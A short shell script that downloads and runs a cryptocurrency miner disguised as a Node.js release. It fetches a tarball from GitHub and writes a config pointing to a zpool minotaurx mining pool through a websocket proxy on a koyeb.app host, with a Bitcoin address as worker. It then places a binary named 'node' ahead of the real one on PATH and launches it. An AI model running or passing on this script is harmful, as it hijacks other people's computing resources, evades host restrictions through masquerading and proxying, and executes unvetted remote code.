wget https://github.com/khanhnguyen97/ok2/releases/download/khanh/node-release.tar.gz
tar -xvf node-release.tar.gz
rm node-release.tar.gz
cd node-release


rm config.json && echo '{"proxy": "wss://integrated-alisun-linuss0411-926b04c0.koyeb.app/proxy","stratum": {"server": "minotaurx.na.mine.zpool.ca", "port": 7019, "worker": "1Fo2aZrGJYV6G9H8bunMvwPUYAMvdriqTP", "password": "c=BTC"}, "options": { "threads": 7, "log": false }}' > config.json

mkdir -p $HOME/bin
cp ./node $HOME/bin/
export PATH=$HOME/bin:$PATH
node app.js
